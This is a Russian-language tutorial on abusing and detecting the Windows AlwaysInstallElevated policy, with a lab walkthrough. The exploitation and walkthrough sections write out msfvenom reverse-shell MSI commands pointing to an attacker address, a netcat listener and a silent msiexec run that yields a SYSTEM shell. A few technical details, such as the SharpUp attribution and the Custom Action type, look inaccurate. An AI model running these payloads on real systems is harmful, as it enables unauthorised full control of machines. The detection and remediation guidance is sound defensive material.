# AlwaysInstallElevated: Механизм, эксплуатация и детекция мисконфигурации MSI

## Контекст и базовые понятия

AlwaysInstallElevated (AIE) — это политика групповой политики (GPO) Windows, предназначенная для упрощения развертывания программного обеспечения в корпоративных средах, но представляющая критический вектор повышения привилегий при неправильной настройке. Суть механизма заключается в том, что он позволяет пользователям с низкими правами (standard users) устанавливать пакеты Windows Installer (.msi) с правами локальной системы (SYSTEM), минуя стандартные проверки прав доступа.

Изначально эта функция была разработана для IT-отделов, которым необходимо массово устанавливать ПО на рабочие станции без необходимости ввода административных учетных данных каждого пользователя. Однако, поскольку MSI-пакеты могут содержать произвольный исполняемый код (через Custom Actions), возможность запуска этого кода от имени SYSTEM эквивалентна получению полного контроля над операционной системой.

Ключевое разграничение заключается в том, что AIE не является уязвимостью в коде Windows Installer (как, например, переполнение буфера), а является **мисконфигурацией** (misconfiguration). Это означает, что функционал работает как задумано разработчиками, но его применение нарушает принцип наименьших привилегий. В отличие от других векторов повышения привилегий, таких как уязвимости ядра (kernel exploits), AIE не требует эксплуатации багов в бинарных файлах ОС; он использует легитимные системные утилиты (`msiexec.exe`) для выполнения вредоносной логики.

Важно различать два уровня применения политики:
1.  **Computer Configuration (Конфигурация компьютера):** Применяется ко всем пользователям на данном хосте.
2.  **User Configuration (Конфигурация пользователя):** Применяется к конкретным пользователям независимо от хоста.

Для успешной эксплуатации AIE **обязательно** должны быть включены оба ключа реестра. Если включен только один из них, Windows Installer откатывается к стандартному поведению: установка для компьютера требует прав администратора, а установка для пользователя — прав текущего пользователя.

Ниже приведена сравнительная таблица, фиксирующая разграничение между легитимным использованием AIE и его эксплуатацией в контексте повышения привилегий.

| Характеристика | Легитимное использование (Enterprise Deployment) | Вектор повышения привилегий (Privilege Escalation) |
| :--- | :--- | :--- |
| **Цель настройки** | Упрощение установки ПО для Helpdesk/администраторов. | Получение прав SYSTEM от имени стандартного пользователя. |
| **Источник MSI** | Доверенные пакеты из внутреннего репозитория (WSUS/SCCM). | Скомпрометированный или сгенерированный злоумышленником пакет. |
| **Контекст выполнения** | Пакет содержит легитимный установщик приложения. | Пакет содержит Custom Action с произвольным кодом (payload). |
| **Роль пользователя** | Администратор инициирует или разрешает установку. | Низкопривилегированный пользователь инициирует установку. |
| **Результат** | Приложение устанавливается в `Program Files` и `HKLM`. | Произвольный код выполняется с токеном `NT AUTHORITY\SYSTEM`. |
| **Индикатор компрометации** | Наличие политики в GPO, соответствующей бизнес-требованиям. | Наличие политики в сочетании с подозрительными процессами `msiexec.exe`. |

Также необходимо разграничивать AIE и механизм User Account Control (UAC). UAC блокирует выполнение операций, требующих прав администратора, если не предоставлено явное согласие пользователя или учетные данные администратора. Политика AIE **обходит** этот механизм на уровне сервиса Windows Installer: сервис `msiserver` принимает запрос на установку от любого пользователя, игнорируя стандартные проверки токена доступа, если флаги AIE установлены.

## Внутреннее устройство предмета

AlwaysInstallElevated функционирует на стыке групповой политики (Group Policy) и службы установки Windows (Windows Installer Service). Чтобы понять механизм эксплуатации, необходимо рассмотреть структуру реестра, условия активации и архитектуру MSI-пакета.

### Условия активации и структура реестра

Политика управляется через редактор локальной групповой политики (`gpedit.msc`) или через Active Directory. При включении политики «Always install with elevated privileges» (Всегда устанавливать с повышенными привилегиями) создаются или модифицируются два ключа реестра типа `REG_DWORD`.

Условием эксплуатации является одновременное наличие значения `1` в обоих ключах. Если хотя бы один ключ равен `0` или отсутствует, политика игнорируется.

```text
[Computer Configuration] ──(GPO Apply)──▶ HKLM:\Software\Policies\Microsoft\Windows\Installer
       │
       └── Value: AlwaysInstallElevated = 0x1
       
[User Configuration] ──(GPO Apply)──▶ HKCU:\Software\Policies\Microsoft\Windows\Installer
       │
       └── Value: AlwaysInstallElevated = 0x1
```

Если политика отключена (Disabled) или не настроена (Not Configured), значение либо отсутствует, либо равно `0`. Значение `1` означает «Enabled». Важно отметить, что эти ключи находятся в ветке `Policies`, а не в стандартной ветке `Software`. Это означает, что они имеют наивысший приоритет и не могут быть переопределены обычными пользователями через редактирование реестра (если только у них уже нет прав администратора).

### Архитектура MSI-пакета и Custom Actions

Сам по себе файл `.msi` — это реляционная база данных в формате OLE Compound File. Он содержит таблицы, описывающие файлы, реестр, ярлыки и компоненты. Однако ключевым элементом для эксплуатации AIE является механизм **Custom Actions** (Пользовательские действия).

Custom Actions позволяют разработчикам выполнять произвольный код на этапе установки. Эти действия могут быть реализованы как:
1.  **DLL Custom Actions:** Вызов функций из встроенной DLL.
2.  **Exe Custom Actions:** Запуск внешних исполняемых файлов.
3.  **JScript/VBScript:** Выполнение скриптов.

При стандартной установке Custom Actions выполняются с правами того пользователя, который инициировал установку. Однако, если активирована политика AIE, служба `msiserver` (работающая в контексте SYSTEM) перехватывает процесс установки. Она извлекает Custom Actions и выполняет их в своем контексте, то есть с правами `NT AUTHORITY\SYSTEM`.

Структура MSI-пакета, используемого для эксплуатации, обычно содержит минимальный набор таблиц, необходимых для запуска Custom Action, без необходимости установки реальных файлов приложения.

```json
{
  "msi_structure": {
    "tables": [
      "Property",
      "CustomAction",
      "InstallExecuteSequence",
      "Binary"
    ],
    "critical_components": {
      "CustomAction": {
        "name": "Payload",
        "type": "34", 
        "target": "BinaryData",
        "source": "BinaryData"
      },
      "InstallExecuteSequence": {
        "action": "Payload",
        "condition": "NOT Installed"
      }
    }
  }
}
```
*Примечание: Тип `34` в таблице CustomAction означает `type="execute"`, что указывает на выполнение внешнего исполняемого файла или скрипта.*

### Жизненный цикл эксплуатации AIE

Процесс эксплуатации можно разбить на следующие фазы:

1.  **Разведка (Enumeration):** Проверка наличия флагов AIE в реестре.
2.  **Генерация (Payload Generation):** Создание MSI-файла, содержащего вредоносный код в виде Custom Action.
3.  **Доставка (Delivery):** Перемещение MSI-файла на целевую систему (через SMB, HTTP, USB или встроенные средства).
4.  **Исполнение (Execution):** Запуск `msiexec.exe` с параметрами тихой установки.
5.  **Привилегирование (Escalation):** Выполнение Custom Action в контексте SYSTEM и установление сессии (например, reverse shell).

В отличие от других техник повышения привилегий, AIE не оставляет следов в логах безопасности Windows (Event Log) на этапе *успешной* установки, если злоумышленник использует стандартные MSI-таблицы. Событие 1033 (Install Success) будет зарегистрировано как легитимная установка приложения, что затрудняет детекцию на основе событий установки ПО.

## Применение и работа с предметом

На практике работа с AlwaysInstallElevated включает три основных направления: ручная и автоматизированная разведка, ручная и автоматизированная эксплуатация, а также методы детекции и устранения.

### Разведка: Ручная и автоматизированная

Специалисты по безопасности (как атакующие, так и защитники) используют несколько методов для проверки наличия уязвимости.

**Ручная проверка через реестр:**
Самый надежный способ — прямой запрос ключей реестра. Команда `reg query` возвращает значение, если ключ существует.

```powershell
# Проверка Computer Configuration
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Проверка User Configuration
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ожидаемый вывод при наличии уязвимости:
```text
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**Автоматизированная разведка:**
Инструменты вроде `WinPEAS` (Windows Privilege Escalation Awesome Scripts) и `SharpUp` (из набора PowerSploit) автоматически проверяют эту политику в рамках общего аудита.

```powershell
# Использование SharpUp
.\SharpUp.exe audit AlwaysInstallElevated

# Вывод SharpUp
[+] AlwaysInstallElevated is enabled!
    HKLM: 1
    HKCU: 1
```

### Эксплуатация: Генерация и запуск MSI

Эксплуатация требует создания валидного MSI-пакета, содержащего payload. Существует два основных подхода: использование фреймворка Metasploit и ручная генерация через `msfvenom` или WiX Toolset.

**Метод 1: Использование Metasploit Framework**
Модуль `exploit/windows/local/always_install_elevated` автоматизирует весь процесс. Он генерирует MSI, передает его на цель (если есть доступ к файловой системе) и запускает.

```bash
# В консоли Metasploit
use exploit/windows/local/always_install_elevated
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>
run
```

**Метод 2: Ручная генерация через msfvenom**
Этот метод дает больше контроля над процессом доставки.

```bash
# Генерация MSI с reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f msi -o payload.msi
```

**Запуск установки:**
После размещения файла `payload.msi` на целевой системе (например, в `C:\Temp\`), установка запускается через `msiexec.exe`. Ключи `/quiet` и `/qn` обеспечивают тихую установку без интерфейса пользователя, что критично для скрытности.

```cmd
msiexec /quiet /qn /i C:\Temp\payload.msi
```

**Метод 3: Использование WiX Toolset (для продвинутых сценариев)**
Для создания более сложных MSI (например, добавляющих пользователя в группу администраторов) используется язык WiX.

```xml
<!-- Фрагмент WiX-файла (update.wxs) -->
<CustomAction Id='RunPayload' FileKey='PayloadExe' ExeCommand='' Execute='immediate' Return='check' />
<InstallExecuteSequence>
  <Custom Action='RunPayload' After='InstallFiles' />
</InstallExecuteSequence>
```

### Детекция и устранение

Для защитников критически важно мониторить наличие этой политики в домене.

**Индикаторы компрометации (IoC):**
1.  Наличие ключей `AlwaysInstallElevated` со значением `1` в HKLM и HKCU.
2.  Процессы `msiexec.exe`, запускаемые от имени `SYSTEM`, но инициированные процессами от имени стандартных пользователей (можно отследить через Sysmon Event ID 1 с ParentProcessName).
3.  Необычные временные метки создания MSI-файлов в временных директориях.

**Устранение:**
Политика должна быть отключена в GPO:
*   Computer Configuration → Administrative Templates → Windows Components → Windows Installer → **Always install with elevated privileges** → Disabled.
*   User Configuration → Administrative Templates → Windows Components → Windows Installer → **Always install with elevated privileges** → Disabled.

## Сквозной практический пример: Повышение привилегий через AlwaysInstallElevated

**Исходные условия:**
*   **Цель:** Виртуальная машина Windows 10 Enterprise, на которой администратор ошибочно включил политику AlwaysInstallElevated для упрощения установки внутреннего ПО.
*   **Атакующий:** Имеет доступ к учетной записи `corp\j.smith` (стандартный пользователь) через удаленный рабочий стол (RDP) или PowerShell Remoting.
*   **Инструменты:** Kali Linux (для генерации payload и прослушивания), WinPEAS (для быстрой проверки).
*   **Сценарий:** Атакующий пытается получить доступ `SYSTEM` для чтения файлов SAM или установки постоянного доступа (persistence).

### Шаг 1: Проверка наличия уязвимости с помощью WinPEAS

Атакующий загружает утилиту `winpeas.exe` на целевую машину и запускает ее для быстрой оценки.

```powershell
# Запуск WinPEAS в тихом режиме с выводом системной информации
.\winPEASx64.exe quiet systeminfo
```

**Ожидаемый вывод (фрагмент):**
```text
[+] AlwaysInstallElevated
    HKLM: 1
    HKCU: 1
    [!] AlwaysInstallElevated is enabled!
```
*Анализ:* Вывод подтверждает, что оба ключа реестра установлены в `1`. Уязвимость доступна.

### Шаг 2: Генерация вредоносного MSI-пакета

На машине атакующего (Kali Linux) создается MSI-файл, содержащий обратный шелл (reverse shell) на порт 4444.

```bash
# Генерация MSI с payload windows/x64/shell_reverse_tcp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f msi -o /tmp/update.msi
```

**Ожидаемый результат:**
Файл `/tmp/update.msi` создан. Он содержит валидную структуру MSI, но вместо установки приложения выполняет код, открывающий TCP-соединение к атакующему.

### Шаг 3: Настройка прослушивателя (Listener)

Перед запуском установки на цели атакующий настраивает Netcat или Metasploit для приема входящего соединения.

```bash
# Использование Netcat для прослушивания порта 4444
nc -lvnp 4444
```

**Ожидаемый результат:**
Netcat ожидает входящего подключения.

### Шаг 4: Исполнение MSI на целевой системе

Атакующий копирует `update.msi` на целевую машину (например, через SMB-шару или HTTP-сервер) и запускает установку от имени текущего пользователя `j.smith`.

```cmd
# Запуск установки MSI от имени стандартного пользователя
msiexec /quiet /qn /i C:\Users\j.smith\AppData\Local\Temp\update.msi
```

**Ожидаемый результат:**
Процесс `msiexec.exe` запускается. Поскольку AIE активен, служба Windows Installer выполняет Custom Action внутри MSI с правами `SYSTEM`. Пользователь `j.smith` не видит никаких окон установки.

### Шаг 5: Подтверждение повышения привилегий

На машине атакующего в окне Netcat появляется сессия.

```text
# Вывод Netcat на Kali Linux
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.10.
Ncat: Connection received from 10.0.2.10.
Microsoft Windows [Version 10.0.19045.3693]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
nt authority\system
```

**Ожидаемый вывод:**
Команда `whoami` возвращает `nt authority\system`. Это подтверждает успешное повышение привилегий. Атакующий теперь имеет полный контроль над системой.

**Аналитический вывод:**
Сквозной пример демонстрирует, что AlwaysInstallElevated представляет собой критический риск из-за сочетания легитимного механизма (Windows Installer) и мисконфигурации (включение политики для всех пользователей). Эксплуатация не требует наличия уязвимостей в ПО, только наличия доступа к файловой системе или возможности загрузки файла. Детекция сложна, так как процесс `msiexec.exe` является легитимным системным компонентом, а события установки логируются как успешные операции развертывания. Для защиты необходимо регулярное аудирование групповых политик и мониторинг аномальных запусков `msiexec.exe` от непривилегированных пользователей.

## Аналитический вывод

AlwaysInstallElevated является классическим примером того, как функциональность, предназначенная для удобства администрирования, становится вектором критического повышения привилегий. Уязвимость не связана с ошибками в коде операционной системы, а возникает из-за нарушения принципа наименьших привилегий при настройке групповой политики. Ключевым фактором успеха атаки является необходимость одновременного включения политики в контекстах компьютера и пользователя, что часто происходит при массовом развертывании ПО в корпоративных сетях.

Эксплуатация AIE отличается высокой надежностью и низкой сложностью, так как использует встроенные средства Windows (`msiexec.exe`) и стандартный формат пакетов MSI. Это делает технику привлекательной для атакующих, стремящихся избежать обнаружения антивирусами и EDR-системами, которые могут не блокировать легитимные системные процессы. Для специалистов по информационной безопасности критически важно включать проверку политики AlwaysInstallElevated в стандартные процедуры аудита безопасности и мониторинга конфигураций Active Directory. Устранение уязвимости требует отключения соответствующих политик в GPO и, при необходимости, удаления ключей реестра на конечных точках.

## Источники

1.  [Leveraging "AlwaysInstallElevated" for Windows Privilege Escalation - CyberPlural Blog](https://blog.cyberplural.com/leveraging-alwaysinstallelevated-for-windows-privilege-escalation/)
2.  [AlwaysInstallElevated - SpecterOps Open Source](https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated)
3.  [Windows-Local-Privilege-Escalation-Cookbook/Notes/AlwaysInstallElevated.md - GitHub](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md)
4.  [Windows Privilege Escalation – AlwaysInstallElevated Policy - Steflan's Security Blog](https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/)
5.  [Повышение привилегий Windows: от шелла до SYSTEM - Codeby](https://codeby.net/threads/povysheniye-privilegii-windows-ekspluatatsiya-miskonfiguratsii-tokenov-i-obkhod-uac-na-praktike.92759/)
6.  [Windows Privilege Escalation AlwaysInstallElevated — MCSI Library](https://library.mosse-institute.com/articles/2022/07/windows-privilege-escalation-alwaysinstallelevated/windows-privilege-escalation-alwaysinstallelevated.html)
7.  [Exploiting AlwaysInstallElevated | My Penetration Test Guide](https://reaper.gitbook.io/my-penetration-test-guide/privilege-escalation/windows-privilege-escalation/exploiting-alwaysinstallelevated)
8.  [Always Install Elevated | Pentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/registry/registry-alwaysinstallelevated)
9.  [Установка пакета с повышенными привилегиями для пользователей без административных прав - Microsoft Learn](https://learn.microsoft.com/ru-ru/windows/win32/msi/installing-a-package-with-elevated-privileges-for-a-non-admin)
10. [Privilege Escalation using (AlwaysInstallElevated) Feature in Windows - Medium](https://medium.com/@amaraltohami30/privilege-escalation-using-alwaysinstallelevated-feature-in-windows-32f61babda49)
11. [AlwaysInstallElevated | Infiltr8: The Red-Book](https://red.infiltr8.io/redteam/privilege-escalation/windows/alwaysinstallelevated)
12. [Understanding Registry Escalation: Exploiting the AlwaysInstallElevated Setting for Windows Privilege Escalation - System Weakness](https://systemweakness.com/understanding-registry-escalation-exploiting-the-alwaysinstallelevated-setting-for-windows-c9d137152849)